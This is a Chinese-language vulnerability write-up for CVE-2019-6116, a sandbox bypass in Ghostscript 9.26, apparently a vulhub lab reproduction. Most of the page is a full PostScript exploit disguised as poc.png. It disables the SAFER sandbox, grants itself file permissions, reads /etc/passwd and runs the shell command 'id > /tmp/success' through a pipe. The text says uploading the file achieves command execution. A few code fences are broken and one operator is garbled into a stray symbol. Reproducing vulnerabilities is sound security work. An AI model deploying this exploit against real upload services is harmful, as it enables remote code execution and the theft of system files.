---
title: "（CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞"
id: zhfly2954
---

# （CVE-2019-6116）GhostScript 沙箱绕过（命令执行）漏洞

## 一、漏洞简介

Ghostscript 9.26版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。

## 二、漏洞影响

Ghostscript 9.26版本

## 三、复现过程

**poc.png**

```
%!PS
% extract .actual_pdfpaintproc operator from pdfdict
/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def

/exploit {

(Stage 11: Exploitation…)=

```
/forceput exch def

systemdict /SAFER false forceput
userparams /LockFilePermissions false forceput
systemdict /userparams get /PermitFileControl [(*)] forceput
systemdict /userparams get /PermitFileWriting [(*)] forceput
systemdict /userparams get /PermitFileReading [(*)] forceput

% update
save restore

% All done.
stop 
```

} def

errordict /typecheck {

/typecount typecount 1 add def

(Stage 10: /typecheck #)=only typecount ==

```
% The first error will be the .knownget, which we handle and setup the
% stack. The second error will be the ifelse (missing boolean), and then we
% dump the operands.
typecount 1 eq { null } if
typecount 2 eq { pop 7 get exploit } if
typecount 3 eq { (unexpected)= quit }  if 
```

} put

% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some

% executable arrays onto the operand stack that contain .forceput, but are not

% marked as executeonly or pseudo-operators.

%

% The routine was attempting to pass them to ifelse, but we can cause that to

% fail because when the routine was declared, it used `bind` but many of the

% names it uses are not operators and so are just looked up in the dictstack.

%

% This means we can push a dict onto the dictstack and control how the routine

% works.

<<

/typecount      0

/PDFfile        { (Stage 0: PDFfile)= currentfile }

/q              { (Stage 1: q)= } % no-op

/oget           { (Stage 3: oget)= pop pop 0 } % clear stack

/pdfemptycount  { (Stage 4: pdfemptycount)= } % no-op

/gput           { (Stage 5: gput)= }  % no-op

/resolvestream  { (Stage 6: resolvestream)= } % no-op

/pdfopdict      { (Stage 7: pdfopdict)= } % no-op

/.pdfruncontext { (Stage 8: .pdfruncontext)= 0 1 mark } % satisfy counttomark and index

/pdfdict        { (Stage 9: pdfdict)=

% cause a /typecheck error we handle above

true

}

>> begin <<>> <<>> { .actual_pdfpaintproc } stopped pop

(Should now have complete control over ghostscript, attempting to read /etc/passwd…)=

% Demonstrate reading a file we shouldnt have access to.

(/etc/passwd) ® file dup 64 string readline pop == closefile

(Attempting to execute a shell command…)= flush

% run command

(%pipe%id > /tmp/success) (w) file closefile

(All done.)= `quit` 
```

上传这个poc文件，即可执行`id > /tmp/success`：

![image](../img/1955e4e86937e64a9a8f004eafe2f234.png)

## 参考链接

> https://vulhub.org/#/environments/ghostscript/CVE-2019-6116/